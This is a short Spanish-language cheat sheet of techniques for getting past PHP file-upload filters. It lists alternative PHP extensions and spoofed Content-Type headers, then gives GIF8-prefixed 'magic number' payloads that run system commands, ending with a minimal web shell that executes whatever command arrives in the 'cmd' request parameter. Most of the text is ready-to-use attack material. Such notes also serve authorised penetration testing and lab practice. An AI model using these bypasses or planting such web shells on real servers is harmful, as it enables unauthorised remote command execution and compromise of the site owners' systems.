# Tipos de Bypass

> Conoce algunos tipos de bypass para difente proposito.

## Summary

* [Php](#php)
	* [Subida de archivo](#subida-de-archivos)
	* [Content Type](#content-type)
	* [Magic Number](#magic-number)

## Php

### Subida de archivo

en ocaciones la web no nos permite subir directamente un archivo con extensión `.php` , pero quien sabe las politicas que
tenga implementada ese servidor, existen algunas extensiones que pueden ser de utilidad

- php
- php3
- php4
- php5
- pht
- phtml

### Content Type

otra forma de burlar la restricción de subida de archivos, es cambiando el `Content-Type`

- Content-Type: application/x-php
- Content-Type: image/jpg


### Magic Number

```php
GIF8;
system("whoami");
```

```php
GIF8;
shell_exec("whoami");
```

```php
GIF8;
echo passthru("whoami");
```

```php
GIF8;
$command=$_GET['cmd']; 
echo `$command`;
```
